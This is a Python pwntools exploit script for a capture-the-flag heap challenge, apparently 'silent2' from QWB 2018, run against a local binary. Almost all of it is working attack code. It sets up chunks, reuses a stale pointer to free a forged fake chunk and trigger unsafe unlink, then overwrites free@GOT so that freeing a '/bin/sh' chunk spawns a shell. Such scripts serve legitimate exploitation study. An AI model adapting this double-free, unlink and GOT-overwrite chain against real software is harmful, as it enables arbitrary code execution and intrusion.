from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./data/bin/heap23_09_qwb_2018_silent2")
p = process("./data/bin/heap23_09_qwb_2018_silent2")
libc = elf.libc


def create(size: int, content: bytes):
    p.sendline(b"1")
    p.sendline(str(size).encode())
    p.send(content)


def modify(idx: int, content1: bytes, content2: bytes):
    p.sendline(b"3")
    p.sendline(str(idx).encode())
    p.send(content1)
    p.send(content2)


def delete(idx: int):
    p.sendline(b"2")
    p.sendline(str(idx).encode())


def request2size(req: int) -> int:
    sz = (req + 0x10 + 0xF) & ~0xF
    return max(sz, 0x20)


# -------------------------
# fixed targets
# -------------------------
func_addr = 0x4009C0
free_got = 0x602018
p_addr = 0x6020D8


# -------------------------
# tunable parameters
# -------------------------
x = 0x100  # size for chunk0..chunk4
y = 0x210  # size for the reallocated large chunk


# -------------------------
# derived constraints
# -------------------------
s = request2size(x)          # one small chunk total size
c = 2 * s                    # merged free chunk(3+4) total size
big = request2size(y)

f = s - 0x10                 # fake chunk clean size
z = f | 1                    # fake chunk size field with prev_inuse bit set
l = f - 0x20                 # fill size between fd/bk and next header
m = f                        # overwrite old chunk4->prev_size
n = c - f                    # overwrite old chunk4->size

assert f >= 0x20 and (f & 0xF) == 0
assert l >= 0
assert big == c, "big chunk should exactly reclaim merged chunk3+4"
assert n == s and (n & 1) == 0


p.recvuntil(b"silent2")

# step.1 create 5 same-size chunks
create(x, b"AAAA")
create(x, b"BBBB")
create(x, b"/bin/sh\x00")
create(x, b"DDDD")
create(x, b"EEEE")

# step.2 free 3,4 so they merge in unsorted bin
delete(3)
delete(4)

# step.3 reclaim merged region and forge metadata for second free(4)
payload = p64(0) + p64(z)
payload += p64(p_addr - 0x18) + p64(p_addr - 0x10)
payload += b"A" * l
payload += p64(m) + p64(n)
create(y, payload)

# step.4 free stale ptr[4] again -> unlink on fake chunk
delete(4)

# step.5 make ptr[0] point to free@got, then overwrite free@got with system
modify(3, p64(free_got)[:4], b"1111")
modify(0, p64(func_addr)[:6], b"2222")

# step.6 trigger system("/bin/sh")
delete(2)

p.interactive()
